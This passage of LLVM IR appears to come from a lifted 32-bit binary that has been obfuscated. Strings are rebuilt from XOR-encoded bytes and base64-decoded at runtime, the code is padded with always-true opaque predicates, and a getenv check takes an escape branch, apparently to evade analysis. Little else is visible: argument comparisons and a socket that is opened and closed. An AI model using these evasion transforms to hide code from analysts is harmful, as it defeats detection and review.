  store [1 x i8] c"\71", [1 x i8]* %sp1.112
  %sp1.1.112 = bitcast [1 x i8]* %sp1.112 to i8*
  %i1.112 = load i8, i8* %sp1.1.112

  %xp112 = xor i8 %i0.112, %i1.112

  %fi.112 = alloca i8
  store i8 %xp112, i8* %fi.112

  %final.ptr.112 = bitcast i8* %fi.112 to [1 x i8]*
  %spi112 = load [1 x i8], [1 x i8]* %final.ptr.112
  store [1 x i8] %spi112, [1 x i8]* %sp3.55
;-------------------------------
  %next3.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 4
  
  %sp4.55 = bitcast i8* %next3.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\56", [1 x i8]* %sp4.55
  %sp0.113 = alloca [1 x i8]
  store [1 x i8] c"\0C", [1 x i8]* %sp0.113
  %sp0.1.113 = bitcast [1 x i8]* %sp0.113 to i8*
  %i0.113 = load i8, i8* %sp0.1.113

  %sp1.113 = alloca [1 x i8]
  store [1 x i8] c"\5a", [1 x i8]* %sp1.113
  %sp1.1.113 = bitcast [1 x i8]* %sp1.113 to i8*
  %i1.113 = load i8, i8* %sp1.1.113

  %xp113 = xor i8 %i0.113, %i1.113

  %fi.113 = alloca i8
  store i8 %xp113, i8* %fi.113

  %final.ptr.113 = bitcast i8* %fi.113 to [1 x i8]*
  %spi113 = load [1 x i8], [1 x i8]* %final.ptr.113
  store [1 x i8] %spi113, [1 x i8]* %sp4.55
;-------------------------------
  %next4.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 5
  
  %sp5.55 = bitcast i8* %next4.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\55", [1 x i8]* %sp5.55
  %sp0.114 = alloca [1 x i8]
  store [1 x i8] c"\0D", [1 x i8]* %sp0.114
  %sp0.1.114 = bitcast [1 x i8]* %sp0.114 to i8*
  %i0.114 = load i8, i8* %sp0.1.114

  %sp1.114 = alloca [1 x i8]
  store [1 x i8] c"\58", [1 x i8]* %sp1.114
  %sp1.1.114 = bitcast [1 x i8]* %sp1.114 to i8*
  %i1.114 = load i8, i8* %sp1.1.114

  %xp114 = xor i8 %i0.114, %i1.114

  %fi.114 = alloca i8
  store i8 %xp114, i8* %fi.114

  %final.ptr.114 = bitcast i8* %fi.114 to [1 x i8]*
  %spi114 = load [1 x i8], [1 x i8]* %final.ptr.114
  store [1 x i8] %spi114, [1 x i8]* %sp5.55
;-------------------------------
  %next5.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 6
  
  %sp6.55 = bitcast i8* %next5.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\63", [1 x i8]* %sp6.55
  %sp0.115 = alloca [1 x i8]
  store [1 x i8] c"\0C", [1 x i8]* %sp0.115
  %sp0.1.115 = bitcast [1 x i8]* %sp0.115 to i8*
  %i0.115 = load i8, i8* %sp0.1.115

  %sp1.115 = alloca [1 x i8]
  store [1 x i8] c"\6f", [1 x i8]* %sp1.115
  %sp1.1.115 = bitcast [1 x i8]* %sp1.115 to i8*
  %i1.115 = load i8, i8* %sp1.1.115

  %xp115 = xor i8 %i0.115, %i1.115

  %fi.115 = alloca i8
  store i8 %xp115, i8* %fi.115

  %final.ptr.115 = bitcast i8* %fi.115 to [1 x i8]*
  %spi115 = load [1 x i8], [1 x i8]* %final.ptr.115
  store [1 x i8] %spi115, [1 x i8]* %sp6.55
;-------------------------------
  %next6.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 7
  
  %sp7.55 = bitcast i8* %next6.55 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp7.55
  %sp0.116 = alloca [1 x i8]
  store [1 x i8] c"\2E", [1 x i8]* %sp0.116
  %sp0.1.116 = bitcast [1 x i8]* %sp0.116 to i8*
  %i0.116 = load i8, i8* %sp0.1.116

  %sp1.116 = alloca [1 x i8]
  store [1 x i8] c"\6f", [1 x i8]* %sp1.116
  %sp1.1.116 = bitcast [1 x i8]* %sp1.116 to i8*
  %i1.116 = load i8, i8* %sp1.1.116

  %xp116 = xor i8 %i0.116, %i1.116

  %fi.116 = alloca i8
  store i8 %xp116, i8* %fi.116

  %final.ptr.116 = bitcast i8* %fi.116 to [1 x i8]*
  %spi116 = load [1 x i8], [1 x i8]* %final.ptr.116
  store [1 x i8] %spi116, [1 x i8]* %sp7.55
;-------------------------------
  %next7.55 = getelementptr [9 x i8], [9 x i8]* %sp55, i32 0, i32 8
  
  %sp8.55 = bitcast i8* %next7.55 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp8.55

  %spi55 = load [9 x i8], [9 x i8]* %sp55
  store [9 x i8] %spi55, [9 x i8]* %cipher.ptr.43
;-------------------------------
;-------------------------------
;----------Random Cond----------
  %.not86.i.i = icmp eq i32 2 , %rand_fin85 
  br i1 %.not86.i.i, label %next86, label %BB_82
next86:
;-------------------------------
  %cipher.43 = getelementptr inbounds [9 x i8], [9 x i8]* %cipher.ptr.43, i32 0, i32 0
  %plain.ptr.43 = tail call i8* @base64_decode(i8* %cipher.43)
  %tmp.43 = bitcast i8* %plain.ptr.43 to [6 x i8]*
  %spi43 = load [6 x i8], [6 x i8]* %tmp.43
  store [6 x i8] %spi43, [6 x i8]* %debug.str.0.27
;-------------------------------
  %debug.ptr.0.27 = ptrtoint [6 x i8]* %debug.str.0.27 to i32
  %result.0.27 = tail call i32 @getenv(i32 %debug.ptr.0.27)
  %must.escape.0.27 = icmp ne i32 %result.0.27, 0
  br i1 %must.escape.0.27, label %.escape.27, label %.proceed.0.27
.proceed.0.27:
;----------------------------
  %tmp2_v.i16.i = add i32 %arg_esp, 4
  %tmp0_v.i17.i = and i32 %arg_esp, -16
  %0 = inttoptr i32 %arg_esp to i32*
  %1 = load i32, i32* %0, align 4
  %tmp2_v3.i.i = add i32 %tmp0_v.i17.i, -4
  %2 = inttoptr i32 %tmp2_v3.i.i to i32*
  store i32 %1, i32* %2, align 4
  %tmp2_v4.i19.i = add i32 %tmp0_v.i17.i, -8
  %3 = inttoptr i32 %tmp2_v4.i19.i to i32*
  store i32 0, i32* %3, align 8
  %tmp2_v5.i20.i = add i32 %tmp0_v.i17.i, -12
  %4 = inttoptr i32 %tmp2_v5.i20.i to i32*
  store i32 0, i32* %4, align 4
  %tmp2_v6.i22.i = add i32 %tmp0_v.i17.i, -16
  %5 = inttoptr i32 %tmp2_v6.i22.i to i32*
  store i32 0, i32* %5, align 16
  %tmp2_v7.i24.i = add i32 %tmp0_v.i17.i, -20
  %6 = inttoptr i32 %tmp2_v7.i24.i to i32*
  store i32 %tmp2_v.i16.i, i32* %6, align 4
  %tmp2_v9.i.i = add i32 %tmp0_v.i17.i, -36
  %7 = inttoptr i32 %tmp2_v9.i.i to i32*
  store i32 134517759, i32* %7, align 4
  %tmp2_v.i1.i = add i32 %arg_esp, 8
  %8 = inttoptr i32 %tmp2_v.i1.i to i32*
  %9 = load i32, i32* %8, align 4
;-------------------------------
;--------Basic Condition--------
  %.not16.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not16.i.i, label %BB_16, label %next16
next16:
;-------------------------------
  %tmp0_v2.i.i = add i32 %9, 4
;-------------------------------
;--------Basic Condition--------
  %.not18.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not18.i.i, label %BB_18, label %next18
next18:
;-------------------------------
  %10 = inttoptr i32 %tmp0_v2.i.i to i32*
  %11 = load i32, i32* %10, align 4
  %tmp2_v6.i.i = add i32 %tmp0_v.i17.i, -44
  %12 = inttoptr i32 %tmp2_v6.i.i to i32*
;-------------------------------
; Replace: store i32 134520900, i32* %12, align 4
  %cipher.ptr.44 = alloca [5 x i8]
;-------------------------------
; Replace: store [5 x i8] c"\4d\51\41\3d\00", [5 x i8]* %cipher.ptr.44
  %sp56 = alloca [5 x i8]

  
  %sp0.56 = bitcast [5 x i8]* %sp56 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\4d", [1 x i8]* %sp0.56
  %sp0.117 = alloca [1 x i8]
  store [1 x i8] c"\0C", [1 x i8]* %sp0.117
  %sp0.1.117 = bitcast [1 x i8]* %sp0.117 to i8*
  %i0.117 = load i8, i8* %sp0.1.117

  %sp1.117 = alloca [1 x i8]
  store [1 x i8] c"\41", [1 x i8]* %sp1.117
  %sp1.1.117 = bitcast [1 x i8]* %sp1.117 to i8*
  %i1.117 = load i8, i8* %sp1.1.117

  %xp117 = xor i8 %i0.117, %i1.117

  %fi.117 = alloca i8
  store i8 %xp117, i8* %fi.117

  %final.ptr.117 = bitcast i8* %fi.117 to [1 x i8]*
  %spi117 = load [1 x i8], [1 x i8]* %final.ptr.117
  store [1 x i8] %spi117, [1 x i8]* %sp0.56
;-------------------------------
  %next0.56 = getelementptr [5 x i8], [5 x i8]* %sp56, i32 0, i32 1
  
  %sp1.56 = bitcast i8* %next0.56 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\51", [1 x i8]* %sp1.56
  %sp0.118 = alloca [1 x i8]
  store [1 x i8] c"\02", [1 x i8]* %sp0.118
  %sp0.1.118 = bitcast [1 x i8]* %sp0.118 to i8*
  %i0.118 = load i8, i8* %sp0.1.118

  %sp1.118 = alloca [1 x i8]
  store [1 x i8] c"\53", [1 x i8]* %sp1.118
  %sp1.1.118 = bitcast [1 x i8]* %sp1.118 to i8*
  %i1.118 = load i8, i8* %sp1.1.118

  %xp118 = xor i8 %i0.118, %i1.118

  %fi.118 = alloca i8
  store i8 %xp118, i8* %fi.118

  %final.ptr.118 = bitcast i8* %fi.118 to [1 x i8]*
  %spi118 = load [1 x i8], [1 x i8]* %final.ptr.118
  store [1 x i8] %spi118, [1 x i8]* %sp1.56
;-------------------------------
  %next1.56 = getelementptr [5 x i8], [5 x i8]* %sp56, i32 0, i32 2
  
  %sp2.56 = bitcast i8* %next1.56 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp2.56
  %sp0.119 = alloca [1 x i8]
  store [1 x i8] c"\2E", [1 x i8]* %sp0.119
  %sp0.1.119 = bitcast [1 x i8]* %sp0.119 to i8*
  %i0.119 = load i8, i8* %sp0.1.119

  %sp1.119 = alloca [1 x i8]
  store [1 x i8] c"\6f", [1 x i8]* %sp1.119
  %sp1.1.119 = bitcast [1 x i8]* %sp1.119 to i8*
  %i1.119 = load i8, i8* %sp1.1.119

  %xp119 = xor i8 %i0.119, %i1.119

  %fi.119 = alloca i8
  store i8 %xp119, i8* %fi.119

  %final.ptr.119 = bitcast i8* %fi.119 to [1 x i8]*
  %spi119 = load [1 x i8], [1 x i8]* %final.ptr.119
  store [1 x i8] %spi119, [1 x i8]* %sp2.56
;-------------------------------
  %next2.56 = getelementptr [5 x i8], [5 x i8]* %sp56, i32 0, i32 3
  
  %sp3.56 = bitcast i8* %next2.56 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp3.56
  %sp0.120 = alloca [1 x i8]
  store [1 x i8] c"\5B", [1 x i8]* %sp0.120
  %sp0.1.120 = bitcast [1 x i8]* %sp0.120 to i8*
  %i0.120 = load i8, i8* %sp0.1.120

  %sp1.120 = alloca [1 x i8]
  store [1 x i8] c"\66", [1 x i8]* %sp1.120
  %sp1.1.120 = bitcast [1 x i8]* %sp1.120 to i8*
  %i1.120 = load i8, i8* %sp1.1.120

  %xp120 = xor i8 %i0.120, %i1.120

  %fi.120 = alloca i8
  store i8 %xp120, i8* %fi.120

  %final.ptr.120 = bitcast i8* %fi.120 to [1 x i8]*
  %spi120 = load [1 x i8], [1 x i8]* %final.ptr.120
  store [1 x i8] %spi120, [1 x i8]* %sp3.56
;-------------------------------
  %next3.56 = getelementptr [5 x i8], [5 x i8]* %sp56, i32 0, i32 4
  
  %sp4.56 = bitcast i8* %next3.56 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp4.56

  %spi56 = load [5 x i8], [5 x i8]* %sp56
  store [5 x i8] %spi56, [5 x i8]* %cipher.ptr.44
;-------------------------------
  %cipher.44 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.44, i32 0, i32 0
  %plain.ptr.44 = tail call i8* @base64_decode(i8* %cipher.44)
  %spi44 = ptrtoint i8* %plain.ptr.44 to i32
  store i32 %spi44, i32* %12, align 4
;-------------------------------
  %tmp2_v7.i.i = add i32 %tmp0_v.i17.i, -48
  %13 = inttoptr i32 %tmp2_v7.i.i to i32*
  store i32 %11, i32* %13, align 16
  %tmp2_v8.i.i = add i32 %tmp0_v.i17.i, -52
  %14 = inttoptr i32 %tmp2_v8.i.i to i32*
  store i32 134517791, i32* %14, align 4
  %arg.i.i = load i32, i32* %13, align 16
  %arg2.i.i = load i32, i32* %12, align 4
  %15 = tail call i32 @strcmp(i32 %arg.i.i, i32 %arg2.i.i)
  %.not.i28.i = icmp eq i32 %15, 0
;-------------------------------
;--------Basic Condition--------
  %.not22.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not22.i.i, label %BB_22, label %next22
next22:
;-------------------------------
  br i1 %.not.i28.i, label %BB_8049426.i, label %BB_804942D.i

BB_8049472.i:                                     ; preds = %BB_8049453.i
  store i32 134517879, i32* %7, align 4
  %tmp2_v.i.i.i = add i32 %tmp0_v.i17.i, -40
  %16 = inttoptr i32 %tmp2_v.i.i.i to i32*
  store i32 %tmp2_v4.i19.i, i32* %16, align 8
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i.i.i = add i32 %tmp0_v.i17.i, -68
  %17 = inttoptr i32 %tmp2_v2.i.i.i to i32*
  store i32 134517678, i32* %17, align 4
  store i32 0, i32* %14, align 4
  %tmp2_v2.i6.i.i = add i32 %tmp0_v.i17.i, -72
  %18 = inttoptr i32 %tmp2_v2.i6.i.i to i32*
  store i32 0, i32* %18, align 8
  %tmp2_v3.i.i.i = add i32 %tmp0_v.i17.i, -76
  %19 = inttoptr i32 %tmp2_v3.i.i.i to i32*
  store i32 1, i32* %19, align 4
  %tmp2_v4.i.i.i = add i32 %tmp0_v.i17.i, -80
  %20 = inttoptr i32 %tmp2_v4.i.i.i to i32*
  store i32 2, i32* %20, align 16
  %tmp2_v5.i.i.i = add i32 %tmp0_v.i17.i, -84
;-------------------------------
;--------Basic Condition--------
  %.not2.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not2.i.i, label %BB_2, label %next2
next2:
;-------------------------------
  %21 = inttoptr i32 %tmp2_v5.i.i.i to i32*
  store i32 134517705, i32* %21, align 4
  %arg.i.i.i = load i32, i32* %20, align 16
  %arg2.i.i.i = load i32, i32* %19, align 4
  %arg4.i.i.i = load i32, i32* %18, align 8
  %22 = tail call i32 @socket(i32 %arg.i.i.i, i32 %arg2.i.i.i, i32 %arg4.i.i.i)
  store i32 %22, i32* %14, align 4
  store i32 %22, i32* %20, align 16
  store i32 134517722, i32* %21, align 4
  %arg.i.i3.i = load i32, i32* %20, align 16
  %23 = tail call i32 @close(i32 %arg.i.i3.i)
  br label %.exit

BB_8049453.i:                                     ; preds = %BB_804942D.i
  %24 = load i32, i32* %8, align 4
  %tmp0_v1.i7.i = add i32 %24, 4
  %25 = inttoptr i32 %tmp0_v1.i7.i to i32*
  %26 = load i32, i32* %25, align 4
;-------------------------------
; Replace: store i32 134520904, i32* %12, align 4
  %cipher.ptr.45 = alloca [5 x i8]
;-------------------------------
; Replace: store [5 x i8] c"\4d\77\41\3d\00", [5 x i8]* %cipher.ptr.45
  %sp57 = alloca [5 x i8]

  
  %sp0.57 = bitcast [5 x i8]* %sp57 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\4d", [1 x i8]* %sp0.57
  %sp0.121 = alloca [1 x i8]
  store [1 x i8] c"\1A", [1 x i8]* %sp0.121
  %sp0.1.121 = bitcast [1 x i8]* %sp0.121 to i8*
  %i0.121 = load i8, i8* %sp0.1.121

  %sp1.121 = alloca [1 x i8]
  store [1 x i8] c"\57", [1 x i8]* %sp1.121
  %sp1.1.121 = bitcast [1 x i8]* %sp1.121 to i8*
  %i1.121 = load i8, i8* %sp1.1.121

  %xp121 = xor i8 %i0.121, %i1.121

  %fi.121 = alloca i8
  store i8 %xp121, i8* %fi.121

  %final.ptr.121 = bitcast i8* %fi.121 to [1 x i8]*
  %spi121 = load [1 x i8], [1 x i8]* %final.ptr.121
  store [1 x i8] %spi121, [1 x i8]* %sp0.57
;-------------------------------
  %next0.57 = getelementptr [5 x i8], [5 x i8]* %sp57, i32 0, i32 1
  
  %sp1.57 = bitcast i8* %next0.57 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\77", [1 x i8]* %sp1.57
  %sp0.122 = alloca [1 x i8]
  store [1 x i8] c"\4E", [1 x i8]* %sp0.122
  %sp0.1.122 = bitcast [1 x i8]* %sp0.122 to i8*
  %i0.122 = load i8, i8* %sp0.1.122

  %sp1.122 = alloca [1 x i8]
  store [1 x i8] c"\39", [1 x i8]* %sp1.122
  %sp1.1.122 = bitcast [1 x i8]* %sp1.122 to i8*
  %i1.122 = load i8, i8* %sp1.1.122

  %xp122 = xor i8 %i0.122, %i1.122

  %fi.122 = alloca i8
  store i8 %xp122, i8* %fi.122

  %final.ptr.122 = bitcast i8* %fi.122 to [1 x i8]*
  %spi122 = load [1 x i8], [1 x i8]* %final.ptr.122
  store [1 x i8] %spi122, [1 x i8]* %sp1.57
;-------------------------------
  %next1.57 = getelementptr [5 x i8], [5 x i8]* %sp57, i32 0, i32 2
  
  %sp2.57 = bitcast i8* %next1.57 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp2.57
  %sp0.123 = alloca [1 x i8]
  store [1 x i8] c"\33", [1 x i8]* %sp0.123
  %sp0.1.123 = bitcast [1 x i8]* %sp0.123 to i8*
  %i0.123 = load i8, i8* %sp0.1.123

  %sp1.123 = alloca [1 x i8]
  store [1 x i8] c"\72", [1 x i8]* %sp1.123
  %sp1.1.123 = bitcast [1 x i8]* %sp1.123 to i8*
  %i1.123 = load i8, i8* %sp1.1.123

  %xp123 = xor i8 %i0.123, %i1.123

  %fi.123 = alloca i8
  store i8 %xp123, i8* %fi.123

  %final.ptr.123 = bitcast i8* %fi.123 to [1 x i8]*
  %spi123 = load [1 x i8], [1 x i8]* %final.ptr.123
  store [1 x i8] %spi123, [1 x i8]* %sp2.57
;-------------------------------
  %next2.57 = getelementptr [5 x i8], [5 x i8]* %sp57, i32 0, i32 3
  
  %sp3.57 = bitcast i8* %next2.57 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp3.57
  %sp0.124 = alloca [1 x i8]
  store [1 x i8] c"\7E", [1 x i8]* %sp0.124
  %sp0.1.124 = bitcast [1 x i8]* %sp0.124 to i8*
  %i0.124 = load i8, i8* %sp0.1.124

  %sp1.124 = alloca [1 x i8]
  store [1 x i8] c"\43", [1 x i8]* %sp1.124
  %sp1.1.124 = bitcast [1 x i8]* %sp1.124 to i8*
  %i1.124 = load i8, i8* %sp1.1.124

  %xp124 = xor i8 %i0.124, %i1.124

  %fi.124 = alloca i8
  store i8 %xp124, i8* %fi.124

  %final.ptr.124 = bitcast i8* %fi.124 to [1 x i8]*
  %spi124 = load [1 x i8], [1 x i8]* %final.ptr.124
  store [1 x i8] %spi124, [1 x i8]* %sp3.57
;-------------------------------
  %next3.57 = getelementptr [5 x i8], [5 x i8]* %sp57, i32 0, i32 4
  
  %sp4.57 = bitcast i8* %next3.57 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp4.57

  %spi57 = load [5 x i8], [5 x i8]* %sp57
  store [5 x i8] %spi57, [5 x i8]* %cipher.ptr.45
;-------------------------------
  %cipher.45 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.45, i32 0, i32 0
  %plain.ptr.45 = tail call i8* @base64_decode(i8* %cipher.45)
  %spi45 = ptrtoint i8* %plain.ptr.45 to i32
  store i32 %spi45, i32* %12, align 4
;-------------------------------
;-------------------------------
;--------Basic Condition--------
;-------------------------------
;--------Basic Condition--------
  %.not10.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not10.i.i, label %BB_10, label %next10
next10:
;-------------------------------
  %.not8.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not8.i.i, label %BB_8, label %next8
next8:
;-------------------------------
  store i32 %26, i32* %13, align 16
  store i32 134517867, i32* %14, align 4
  %arg.i.i5 = load i32, i32* %13, align 16
  %arg2.i.i6 = load i32, i32* %12, align 4
;-------------------------------
;--------Basic Condition--------
  %.not14.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not14.i.i, label %BB_14, label %next14
next14:
;-------------------------------
  %27 = tail call i32 @strcmp(i32 %arg.i.i5, i32 %arg2.i.i6)
  %.not.i.i = icmp eq i32 %27, 0
  br i1 %.not.i.i, label %BB_8049472.i, label %.exit

BB_8049426.i:                                     ; preds = %Func_804941F.exit.i
  store i32 134517803, i32* %7, align 4
  %tmp2_v.i.i.i8 = add i32 %tmp0_v.i17.i, -40
  %28 = inttoptr i32 %tmp2_v.i.i.i8 to i32*
  store i32 %tmp2_v4.i19.i, i32* %28, align 8
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i.i.i10 = add i32 %tmp0_v.i17.i, -68
  %29 = inttoptr i32 %tmp2_v2.i.i.i10 to i32*
;-------------------------------
; Replace: store i32 134517414, i32* %29, align 4
  %cipher.ptr.46 = alloca [9 x i8]
;-------------------------------
; Replace: store [9 x i8] c"\42\56\6f\74\41\41\3d\3d\00", [9 x i8]* %cipher.ptr.46
  %sp58 = alloca [9 x i8]

  
  %sp0.58 = bitcast [9 x i8]* %sp58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\42", [1 x i8]* %sp0.58
  %sp0.125 = alloca [1 x i8]
  store [1 x i8] c"\38", [1 x i8]* %sp0.125
  %sp0.1.125 = bitcast [1 x i8]* %sp0.125 to i8*
  %i0.125 = load i8, i8* %sp0.1.125

  %sp1.125 = alloca [1 x i8]
  store [1 x i8] c"\7a", [1 x i8]* %sp1.125
  %sp1.1.125 = bitcast [1 x i8]* %sp1.125 to i8*
  %i1.125 = load i8, i8* %sp1.1.125

  %xp125 = xor i8 %i0.125, %i1.125

  %fi.125 = alloca i8
  store i8 %xp125, i8* %fi.125

  %final.ptr.125 = bitcast i8* %fi.125 to [1 x i8]*
  %spi125 = load [1 x i8], [1 x i8]* %final.ptr.125
  store [1 x i8] %spi125, [1 x i8]* %sp0.58
;-------------------------------
  %next0.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 1
  
  %sp1.58 = bitcast i8* %next0.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\56", [1 x i8]* %sp1.58
  %sp0.126 = alloca [1 x i8]
  store [1 x i8] c"\06", [1 x i8]* %sp0.126
  %sp0.1.126 = bitcast [1 x i8]* %sp0.126 to i8*
  %i0.126 = load i8, i8* %sp0.1.126

  %sp1.126 = alloca [1 x i8]
  store [1 x i8] c"\50", [1 x i8]* %sp1.126
  %sp1.1.126 = bitcast [1 x i8]* %sp1.126 to i8*
  %i1.126 = load i8, i8* %sp1.1.126

  %xp126 = xor i8 %i0.126, %i1.126

  %fi.126 = alloca i8
  store i8 %xp126, i8* %fi.126

  %final.ptr.126 = bitcast i8* %fi.126 to [1 x i8]*
  %spi126 = load [1 x i8], [1 x i8]* %final.ptr.126
  store [1 x i8] %spi126, [1 x i8]* %sp1.58
;-------------------------------
  %next1.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 2
  
  %sp2.58 = bitcast i8* %next1.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\6f", [1 x i8]* %sp2.58
  %sp0.127 = alloca [1 x i8]
  store [1 x i8] c"\5C", [1 x i8]* %sp0.127
  %sp0.1.127 = bitcast [1 x i8]* %sp0.127 to i8*
  %i0.127 = load i8, i8* %sp0.1.127

  %sp1.127 = alloca [1 x i8]
  store [1 x i8] c"\33", [1 x i8]* %sp1.127
  %sp1.1.127 = bitcast [1 x i8]* %sp1.127 to i8*
  %i1.127 = load i8, i8* %sp1.1.127

  %xp127 = xor i8 %i0.127, %i1.127

  %fi.127 = alloca i8
  store i8 %xp127, i8* %fi.127

  %final.ptr.127 = bitcast i8* %fi.127 to [1 x i8]*
  %spi127 = load [1 x i8], [1 x i8]* %final.ptr.127
  store [1 x i8] %spi127, [1 x i8]* %sp2.58
;-------------------------------
  %next2.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 3
  
  %sp3.58 = bitcast i8* %next2.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\74", [1 x i8]* %sp3.58
  %sp0.128 = alloca [1 x i8]
  store [1 x i8] c"\22", [1 x i8]* %sp0.128
  %sp0.1.128 = bitcast [1 x i8]* %sp0.128 to i8*
  %i0.128 = load i8, i8* %sp0.1.128

  %sp1.128 = alloca [1 x i8]
  store [1 x i8] c"\56", [1 x i8]* %sp1.128
  %sp1.1.128 = bitcast [1 x i8]* %sp1.128 to i8*
  %i1.128 = load i8, i8* %sp1.1.128

  %xp128 = xor i8 %i0.128, %i1.128

  %fi.128 = alloca i8
  store i8 %xp128, i8* %fi.128

  %final.ptr.128 = bitcast i8* %fi.128 to [1 x i8]*
  %spi128 = load [1 x i8], [1 x i8]* %final.ptr.128
  store [1 x i8] %spi128, [1 x i8]* %sp3.58
;-------------------------------
  %next3.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 4
  
  %sp4.58 = bitcast i8* %next3.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp4.58
  %sp0.129 = alloca [1 x i8]
  store [1 x i8] c"\07", [1 x i8]* %sp0.129
  %sp0.1.129 = bitcast [1 x i8]* %sp0.129 to i8*
  %i0.129 = load i8, i8* %sp0.1.129

  %sp1.129 = alloca [1 x i8]
  store [1 x i8] c"\46", [1 x i8]* %sp1.129
  %sp1.1.129 = bitcast [1 x i8]* %sp1.129 to i8*
  %i1.129 = load i8, i8* %sp1.1.129

  %xp129 = xor i8 %i0.129, %i1.129

  %fi.129 = alloca i8
  store i8 %xp129, i8* %fi.129

  %final.ptr.129 = bitcast i8* %fi.129 to [1 x i8]*
  %spi129 = load [1 x i8], [1 x i8]* %final.ptr.129
  store [1 x i8] %spi129, [1 x i8]* %sp4.58
;-------------------------------
  %next4.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 5
  
  %sp5.58 = bitcast i8* %next4.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\41", [1 x i8]* %sp5.58
  %sp0.130 = alloca [1 x i8]
  store [1 x i8] c"\00", [1 x i8]* %sp0.130
  %sp0.1.130 = bitcast [1 x i8]* %sp0.130 to i8*
  %i0.130 = load i8, i8* %sp0.1.130

  %sp1.130 = alloca [1 x i8]
  store [1 x i8] c"\41", [1 x i8]* %sp1.130
  %sp1.1.130 = bitcast [1 x i8]* %sp1.130 to i8*
  %i1.130 = load i8, i8* %sp1.1.130

  %xp130 = xor i8 %i0.130, %i1.130

  %fi.130 = alloca i8
  store i8 %xp130, i8* %fi.130

  %final.ptr.130 = bitcast i8* %fi.130 to [1 x i8]*
  %spi130 = load [1 x i8], [1 x i8]* %final.ptr.130
  store [1 x i8] %spi130, [1 x i8]* %sp5.58
;-------------------------------
  %next5.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 6
  
  %sp6.58 = bitcast i8* %next5.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp6.58
  %sp0.131 = alloca [1 x i8]
  store [1 x i8] c"\0D", [1 x i8]* %sp0.131
  %sp0.1.131 = bitcast [1 x i8]* %sp0.131 to i8*
  %i0.131 = load i8, i8* %sp0.1.131

  %sp1.131 = alloca [1 x i8]
  store [1 x i8] c"\30", [1 x i8]* %sp1.131
  %sp1.1.131 = bitcast [1 x i8]* %sp1.131 to i8*
  %i1.131 = load i8, i8* %sp1.1.131

  %xp131 = xor i8 %i0.131, %i1.131

  %fi.131 = alloca i8
  store i8 %xp131, i8* %fi.131

  %final.ptr.131 = bitcast i8* %fi.131 to [1 x i8]*
  %spi131 = load [1 x i8], [1 x i8]* %final.ptr.131
  store [1 x i8] %spi131, [1 x i8]* %sp6.58
;-------------------------------
  %next6.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 7
  
  %sp7.58 = bitcast i8* %next6.58 to [1 x i8]*
;-------------------------------
; Replace: store [1 x i8] c"\3d", [1 x i8]* %sp7.58
  %sp0.132 = alloca [1 x i8]
  store [1 x i8] c"\67", [1 x i8]* %sp0.132
  %sp0.1.132 = bitcast [1 x i8]* %sp0.132 to i8*
  %i0.132 = load i8, i8* %sp0.1.132

  %sp1.132 = alloca [1 x i8]
  store [1 x i8] c"\5a", [1 x i8]* %sp1.132
  %sp1.1.132 = bitcast [1 x i8]* %sp1.132 to i8*
  %i1.132 = load i8, i8* %sp1.1.132

  %xp132 = xor i8 %i0.132, %i1.132

  %fi.132 = alloca i8
  store i8 %xp132, i8* %fi.132

  %final.ptr.132 = bitcast i8* %fi.132 to [1 x i8]*
  %spi132 = load [1 x i8], [1 x i8]* %final.ptr.132
  store [1 x i8] %spi132, [1 x i8]* %sp7.58
;-------------------------------
  %next7.58 = getelementptr [9 x i8], [9 x i8]* %sp58, i32 0, i32 8
  
  %sp8.58 = bitcast i8* %next7.58 to [1 x i8]*
  store [1 x i8] c"\00", [1 x i8]* %sp8.58

  %spi58 = load [9 x i8], [9 x i8]* %sp58
